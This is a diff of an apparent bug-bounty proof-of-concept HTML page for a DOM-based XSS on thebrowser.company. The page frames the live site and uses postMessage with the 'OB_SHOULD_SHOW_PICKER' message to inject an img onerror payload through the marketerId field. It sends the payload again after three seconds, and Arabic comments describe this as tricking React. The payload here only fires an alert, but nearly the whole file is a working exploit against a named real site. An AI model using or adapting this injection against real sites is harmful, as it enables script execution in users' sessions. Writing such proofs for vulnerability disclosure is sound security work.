@@ -1,28 +1,38 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>✅ PoC - alert XSS in thebrowser.company</title>
-  </head>
-  <body>
-    <h2>✅ DOM XSS PoC - alert version</h2>
-    <iframe id="target" src="https://thebrowser.company" width="100%" height="600" style="border:2px solid black;"></iframe>
+<head>
+  <title>🔥 Final XSS PoC - thebrowser.company</title>
+</head>
+<body>
+  <h2>🔥 DOM XSS PoC - External Execution</h2>
+  <p>✅ This page will trigger <code>alert(1)</code> inside <code>https://thebrowser.company</code> automatically.</p>
 
-    <script>
-      const iframe = document.getElementById("target");
+  <iframe id="target" src="https://thebrowser.company" width="100%" height="600" style="border:2px solid black;"></iframe>
 
-      iframe.onload = () => {
-        console.log("✅ iframe loaded");
+  <script>
+    const iframe = document.getElementById("target");
 
-        const payload = {
-          message: "OB_SHOULD_SHOW_PICKER",
-          content: {
-            marketerId: `<img src='x' onerror='alert(document.domain)'>`
-          }
-        };
+    // بايلود XSS
+    const payload = {
+      message: "OB_SHOULD_SHOW_PICKER",
+      content: {
+        marketerId: `<img src='x' onerror='alert(1)'>`
+      }
+    };
 
-        console.log("🚀 Sending XSS payload...");
+    // بعد تحميل iframe نرسل البايلود
+    iframe.onload = () => {
+      console.log("✅ iframe loaded");
+
+      // إرسال البايلود مباشرة
+      iframe.contentWindow.postMessage(payload, "*");
+
+      // محاولة خداع React بإرسال البايلود مرة أخرى بعد 3 ثوانٍ
+      setTimeout(() => {
+        console.log("🚀 Re-sending payload...");
         iframe.contentWindow.postMessage(payload, "*");
-      };
-    </script>
-  </body>
+      }, 3000);
+    };
+  </script>
+</body>
 </html>
